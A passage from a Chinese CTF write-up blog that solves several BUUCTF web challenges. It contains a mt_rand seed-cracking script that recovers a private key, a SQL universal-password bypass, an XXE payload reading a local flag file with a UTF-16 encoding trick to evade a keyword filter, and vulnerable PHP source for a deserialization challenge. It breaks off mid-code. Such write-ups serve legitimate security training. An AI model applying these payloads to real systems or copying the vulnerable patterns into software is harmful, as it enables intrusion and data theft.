class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$result</span>))&#123;     </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = <span class="title function_ invoke__">public_key</span>();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>
<p>第一个问题就是如何得到私钥，题目给了我们公钥为<code>KVQP0LdJKRaV3n9D</code>，观察生成公钥和私钥的函数可以发现，用的是<code>mt_rand</code>可以进行伪造，写一个脚本变成<code>php_mt_seed</code>能看得懂的形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>得出结果：<br><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </code><br>让脚本计算种子：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672748563731-d89f57cb-935b-417c-a909-d42cf8683b72.png" alt="image.png"><br>获取种子后就可以获取私钥：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//genarate private_key</span><br><span class="line">function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(public_key());</span><br><span class="line">var_dump(private_key());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672748586705-05d53426-d3ae-4a9d-8f00-79f92c8e6b7a.png" alt="image.png"><br>私钥为<code>XuNhoueCDCGc</code>，还有一个小地方需要绕过，就是源码处的password，由于没做任何过滤，直接万能密码即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672748622546-9e7e1110-19da-40de-9e85-c9c3c0303faf.png" alt="image.png"></p>
<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>简单题且BUUCTF靶场好像复现不了，有问题没修复-2023-1.4</p>
<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>考点:XXE注入绕过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672821399818-52d6b531-7229-4b09-9d1f-70094d528d71.png" alt="image.png"><br>一个简单的web，有个文件上传的功能，是上传xml文件的地方：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672821417012-213320cc-e1cd-4933-ab05-d404960c23af.png" alt="image.png"><br>这是题目给的上传样例，考点自然就是XXE注入，但是这里过滤了<code>SYSTEM,ENTITY,file</code>等字样，需要bypass，在网上检索到了绕过xxe保护的文章：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672821484585-8960c6b2-a95f-4dc0-b005-967cd9e0e02c.png" alt="image.png"><br>可以用编码绕过，也就是我们可以把xml文件从UTF-8转到UTF-16BE格式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE feng [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;alice123&lt;/username&gt;</span><br><span class="line">&lt;password&gt;passwd1&lt;/password&gt;</span><br><span class="line">&lt;name&gt;Alice&lt;/name&gt;</span><br><span class="line">&lt;email&gt;Boogipop	&lt;/email&gt;</span><br><span class="line">&lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">&lt;intro&gt;&amp;file;&lt;/intro&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;bob&lt;/username&gt;</span><br><span class="line">&lt;password&gt;passwd2&lt;/password&gt;</span><br><span class="line">&lt;name&gt; Bob&lt;/name&gt;</span><br><span class="line">&lt;email&gt;bob<span class="meta">@fakesite</span>.com&lt;/email&gt;</span><br><span class="line">&lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">&lt;intro&gt;HACKED!&lt;/intro&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure>
<p><code>cat 1.xml|iconv -f UTF-8 -t UTF-16BE &gt;flag.xml</code><br>之后上传文件就getflag了：<br>    <img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1672821570366-d799692b-4dbb-463f-a5f9-e29754f65b47.png" alt="image.png"></p>
<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>考点：反序列化字符逃逸，代码审计，信息泄露<br><a href="http://www.zip泄露：">www.zip泄露：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mysqli</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;id)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Info</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span 